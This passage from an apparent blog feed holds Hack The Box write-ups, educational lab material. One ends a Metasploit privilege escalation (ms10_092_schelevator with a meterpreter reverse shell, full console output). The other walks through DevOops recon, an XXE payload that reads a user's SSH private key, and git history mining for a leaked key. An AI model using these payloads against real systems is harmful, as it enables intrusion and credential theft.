msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;PAYLOAD windows/x64/meterpreter/reverse_tcp   &lt;span class=&quot;c&quot;&gt;# If the exploit works, we want a new reverse shell&lt;/span&gt;
PAYLOAD &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; windows/x64/meterpreter/reverse_tcp
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LPORT 4445  &lt;span class=&quot;c&quot;&gt;# The local port to listen on&lt;/span&gt;
LPORT &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 4445
msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 10.10.13.75  &lt;span class=&quot;c&quot;&gt;# Ip address of our machine&lt;/span&gt;
LHOST &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 10.10.13.75
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we can launch the exploit:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/local/ms10_092_schelevator&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.13.75:4445
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Preparing payload at C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;EMP&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;IydYyMVXS.exe
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating task: sMVszFGn5xTj
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: The scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt; has successfully been created.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Reading the task file contents from C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;asks&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;MVszFGn5xTj...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Original CRC32: 0xa1c992cd
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Final CRC32: 0xa1c992cd
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Writing our modified content back...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Validating task: sMVszFGn5xTj
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Folder: &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; TaskName                                 Next Run Time          Status         
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;======================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===============&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; sMVszFGn5xTj                             11/1/2018 9:14:00 PM   Ready          
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Disabling the task...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: The parameters of scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt; have been changed.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Enabling the task...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: The parameters of scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt; have been changed.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Executing the task...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Sending stage &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;206403 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to 10.10.10.93
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: Attempted to run the scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Deleting the task...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Meterpreter session 2 opened &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.13.75:4445 -&amp;gt; 10.10.10.93:49162&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-10-28 20:14:13 +0100
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SUCCESS: The scheduled task &lt;span class=&quot;s2&quot;&gt;&quot;sMVszFGn5xTj&quot;&lt;/span&gt; was successfully deleted.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SCHELEVATOR

meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid&lt;/code&gt; command will confirm that the exploit worked:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; getuid
Server username: NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can now retrieve the &lt;strong&gt;root flag&lt;/strong&gt; the same way we did for the user:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;C:/Users/Administrator/Desktop/root.txt
c837f7b[...]f9d4f5ea
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://media3.giphy.com/media/g9582DNuQppxC/giphy.gif?cid=3640f6095bd60b65474c4d7255c34b91&quot; alt=&quot;Congratulations&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Et voilà!&lt;/p&gt;

&lt;h2 id=&quot;final-words&quot;&gt;Final Words&lt;/h2&gt;

&lt;p&gt;I hope it gave you a brief overview of the power of &lt;strong&gt;Metasploit Framework&lt;/strong&gt; and its ease of use. However, keep in mind that this tool will not help you to understand what is really happening on the machine.&lt;/p&gt;

&lt;p&gt;Do not hesitate to ask your questions if something remains unclear for you :relaxed:.&lt;/p&gt;
&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out. This machine was pretty easy so I’m going to take this opportunity to explain you the basics of the Metasploit framework.</summary></entry><entry><title type="html">HackTheBox: DevOops writeup</title><link href="http://localhost:4000/HackTheBox-DevOops.html" rel="alternate" type="text/html" title="HackTheBox: DevOops writeup" /><published>2018-10-10T10:00:00+02:00</published><updated>2018-10-10T10:00:00+02:00</updated><id>http://localhost:4000/HackTheBox-DevOops</id><content type="html" xml:base="http://localhost:4000/HackTheBox-DevOops.html">&lt;p&gt;Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-10/devoops-box.png&quot; alt=&quot;DevOops box&quot; title=&quot;DevOops Box&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this article, I’ll detail every step I’ve gone through in order to root the DevOops box, from the reconnaissance phase to the privilege escalation.
 &lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#recon&quot; id=&quot;markdown-toc-recon&quot;&gt;Recon&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port scanning&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-application-mapping&quot; id=&quot;markdown-toc-web-application-mapping&quot;&gt;Web Application Mapping&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#from-xxe-to-user-access&quot; id=&quot;markdown-toc-from-xxe-to-user-access&quot;&gt;From XXE to User access&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#getting-root&quot; id=&quot;markdown-toc-getting-root&quot;&gt;Getting root&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#sensitive-git-repository&quot; id=&quot;markdown-toc-sensitive-git-repository&quot;&gt;Sensitive git repository&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;

&lt;p&gt;The only information we get when starting a new box is the IP address of the machine. With experience, you’ll develop your own reconnaissance routine but I think that all of them start with the good old nmap port scanning.&lt;/p&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port scanning&lt;/h3&gt;

&lt;p&gt;Nmap is a very powerful tool offering a lot of features and options that can be a bit tricky to use for beginners. First, we will perform a fast scan of TCP open ports with OS and services version detection.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:/DevOops&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.10.10.91
    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    | ssh-hostkey:
    |   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    |   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    |_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    5000/tcp open  http    Gunicorn 19.7.1
    | http-methods:
    |_  Supported Methods: HEAD OPTIONS GET
    |_http-server-header: gunicorn/19.7.1
    |_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=utf-8).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;In a future article dedicated to reconnaissance, I’ll show more Nmap commands that can be very useful in other contexts.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The scan output reveals &lt;strong&gt;ssh&lt;/strong&gt; on port 22 and an &lt;strong&gt;http server&lt;/strong&gt; listening on the non-standard port 5000. We also have service versions to keep in mind for an eventual exploit.&lt;/p&gt;

&lt;p&gt;Let’s investigate this Web application and come back to if we hit a deadend.&lt;/p&gt;

&lt;h2 id=&quot;web-application-mapping&quot;&gt;Web Application Mapping&lt;/h2&gt;

&lt;p&gt;First, reach this URL (http://10.10.10.91:5000) with a web browser.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-10/webapp.png&quot; alt=&quot;Website&quot; title=&quot;Website&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The page doesn’t show any link or dynamic content so let’s run &lt;strong&gt;dirb&lt;/strong&gt; in order to discover valid URLs.
Dirb is a web content scanner which bruteforces directories and files names on web servers.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:/DevOops&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dirb http://10.10.10.91:5000

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
DIRB v2.22    
By The Dark Raver
&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

START_TIME: Thu Oct 11 23:16:57 2018
URL_BASE: http://10.10.10.91:5000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;

GENERATED WORDS: 4612                                                          

&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://10.10.10.91:5000/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
+ http://10.10.10.91:5000/feed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:546263&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                               
+ http://10.10.10.91:5000/upload &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:347&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                

&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
END_TIME: Thu Oct 11 23:22:22 2018
DOWNLOADED: 4612 - FOUND: 2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Good news! Upload features are generally poorly secured inside web applications. Let’s visit this page!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-10-10/upload.png&quot; alt=&quot;Upload page&quot; title=&quot;Upload page&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;from-xxe-to-user-access&quot;&gt;From XXE to User access&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Xml eXternal Entities&lt;/strong&gt; is an exploit based on weakly configured XML parsers that allow arbitrary file reading on the webserver.&lt;/p&gt;

&lt;p&gt;Since this web application wants us to upload XML files, it seemed natural to me to test this vulnerability.&lt;/p&gt;

&lt;p&gt;I used the following payload:&lt;/p&gt;
&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--?xml version=&quot;1.0&quot; ?--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY example &quot;Doe&quot;&amp;gt;&lt;/span&gt; ]&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Book&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Author&amp;gt;&lt;/span&gt;BoiteAKlou&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Author&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Subject&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;example;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Subject&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Content&amp;gt;&lt;/span&gt;Payload&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Content&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Book&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;And here is the output from the server:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PROCESSED BLOGPOST: Author: BoiteAKlou Subject: Doe Content: Payload URL for later reference: /uploads/test2.xml File path: /home/roosa/deploy/src&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We see that the Subject has been replaced by &lt;strong&gt;Doe&lt;/strong&gt; so the server is vulnerable.&lt;/p&gt;

&lt;p&gt;At this point, we can retrieve a bunch of interesting files or get &lt;strong&gt;roosa’s private ssh key&lt;/strong&gt; and then login via ssh.&lt;/p&gt;

&lt;p&gt;Here’s the payload I used:&lt;/p&gt;
&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--?xml version=&quot;1.0&quot; ?--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [
&amp;lt;!ELEMENT foo ANY&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///home/roosa/.ssh/id_rsa&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Book&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Author&amp;gt;&lt;/span&gt;BoiteAKlou&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Author&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Subject&amp;gt;&lt;/span&gt;Payload&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Subject&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Content&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Content&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Book&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once the private key retrieved, we can connect via ssh and enjoy the user flag:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:/DevOops&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa roosa@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 4.13.0-37-generic i686&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Documentation:  https://help.ubuntu.com
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Management:     https://landscape.canonical.com
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Thu Oct 11 17:27:36 2018 from 10.10.12.226
roosa@gitter:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
c5808e[..]ecc67b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now things are getting serious…&lt;/p&gt;

&lt;h2 id=&quot;getting-root&quot;&gt;Getting root&lt;/h2&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Every privilege escalation requires an exhaustive enumeration of the system. This is quite a long process which can be facilitated by scripts such as &lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;LinEnum&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I won’t detail here my whole process of enumerating, only the relevant part in our case.&lt;/p&gt;

&lt;p&gt;The TODO note we found when consulting the website suggested that this project was versioned. In that case, it could be interesting to retrieve the content of a &lt;strong&gt;git&lt;/strong&gt; or &lt;strong&gt;svn&lt;/strong&gt; folder.&lt;/p&gt;

&lt;p&gt;You can use the following command to look for any &lt;strong&gt;.git&lt;/strong&gt; directory:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; d &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; .git 2&amp;gt;/dev/null
./work/blogfeed/.git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Great we found one! Let’s see what we can learn from it…&lt;/p&gt;
&lt;h3 id=&quot;sensitive-git-repository&quot;&gt;Sensitive git repository&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git log&lt;/code&gt; shows us every commit message from this repository and the two commits below caught my attention:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson &amp;lt;roosa@solita.fi&amp;gt;
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key

commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson &amp;lt;roosa@solita.fi&amp;gt;
Date:   Mon Mar 19 09:32:03 2018 -0400

    add key for feed integration from tnerprise backend
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I immediately jumped back to the commit where the key was accidentaly added, thanks to this command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout d387abf63e05c9628a59195cec9311751bdb283f
error: Your &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;changes to the following files would be overwritten by checkout:
	run-gunicorn.sh
Please, commit your changes or stash them before you can switch branches.
Aborting
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Crap! We have unstaged changes. No problem, we can tell git to ignore these changes with &lt;code class=&quot;highlighter-rouge&quot;&gt;git checkout -- run-gunicorn.sh&lt;/code&gt; and then re-execute it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout d387abf63e05c9628a59195cec9311751bdb283f
Note: checking out &lt;span class=&quot;s1&quot;&gt;'d387abf63e05c9628a59195cec9311751bdb283f'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

You are &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'detached HEAD'&lt;/span&gt; state. You can look around, make experimental
